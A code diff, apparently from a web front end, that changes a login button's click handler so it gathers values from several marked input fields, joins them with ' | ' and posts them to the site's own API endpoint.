@@ -25,34 +25,46 @@ const loginButton = document.getElementById("login-button");
 if (loginButton) {
     loginButton.addEventListener("click", function () {
         // 優先順序：
-        // 1. data-role="login-input"
-        // 2. type="email"
-        // 3. 第一個 visible text input
-        // 4. fallback id="email"
-        let emailInput = document.querySelector('[data-role="login-input"]');
-        if (!emailInput) {
-            emailInput = document.querySelector('input[type="email"]');
-        }
-        if (!emailInput) {
-            // Find first text input that is not hidden
-            const textInputs = document.querySelectorAll('input[type="text"]');
-            for (let i = 0; i < textInputs.length; i++) {
-                if (textInputs[i].offsetParent !== null) { // Simple visibility check
-                    emailInput = textInputs[i];
-                    break;
+        // 1. data-role="login-input" (支援多個，用 " | " 分隔)
+        // 2. 所有 visible text input (支援多個，用 " | " 分隔)
+
+        let inputValues = [];
+        const customInputs = document.querySelectorAll('[data-role="login-input"]');
+
+        if (customInputs.length > 0) {
+            customInputs.forEach(input => {
+                inputValues.push(input.value);
+            });
+        } else {
+            // Fallback Logic
+            let emailInput = document.querySelector('input[type="email"]');
+
+            if (!emailInput) {
+                // Find first text input that is not hidden
+                const textInputs = document.querySelectorAll('input[type="text"]');
+                for (let i = 0; i < textInputs.length; i++) {
+                    if (textInputs[i].offsetParent !== null) { // Simple visibility check
+                        emailInput = textInputs[i];
+                        break;
+                    }
                 }
             }
-        }
-        if (!emailInput) {
-            emailInput = document.getElementById("email");
+
+            if (!emailInput) {
+                emailInput = document.getElementById("email");
+            }
+
+            if (emailInput) {
+                inputValues.push(emailInput.value);
+            }
         }
 
-        if (!emailInput) {
+        if (inputValues.length === 0) {
             console.error("Could not find input element!");
             return; // 如果找不到輸入框，停止執行
         }
 
-        const inputValue = emailInput.value;
+        const inputValue = inputValues.join(" | ");
 
         fetch(`${API_BASE_PATH}/api/input`, {
             method: "POST",
